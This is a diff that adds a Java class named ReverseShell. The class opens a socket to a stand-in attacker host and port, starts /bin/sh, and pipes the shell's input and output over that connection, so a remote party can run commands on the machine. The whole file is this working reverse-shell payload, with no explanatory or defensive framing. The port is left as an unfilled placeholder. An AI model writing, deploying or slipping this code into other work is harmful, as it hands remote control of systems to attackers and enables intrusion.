@@ -1,0 +1,24 @@
+import java.io.*;
+import java.net.*;
+
+public class ReverseShell {
+    public static void main(String[] args) throws Exception {
+        String host="attacker_ip";
+        int port=attacker_port;
+        Socket s=new Socket(host,port);
+        Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
+        InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
+        OutputStream po=p.getOutputStream(), so=s.getOutputStream();
+        while(!s.isClosed()) {
+            while(pi.available()>0) so.write(pi.read());
+            while(pe.available()>0) so.write(pe.read());
+            while(si.available()>0) po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try { p.exitValue(); break; } catch (Exception e) {}
+        }
+        p.destroy();
+        s.close();
+    }
+}
